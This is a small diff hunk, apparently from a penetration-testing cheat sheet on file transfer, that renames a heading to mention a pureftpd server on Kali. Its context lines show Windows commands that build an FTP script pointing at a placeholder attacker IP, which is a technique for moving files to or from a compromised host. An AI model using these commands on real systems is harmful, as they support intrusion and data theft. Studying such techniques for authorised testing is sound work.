@@ -24,7 +24,7 @@ ftp <attackerip>
 
 -------------------------------------------
 
-FTP (... client on Kali)
+FTP (pureftpd client on Kali)
 # On Windows
 echo open <attackerip> 21> ftp.txt
 echo USER username password >> ftp.txt
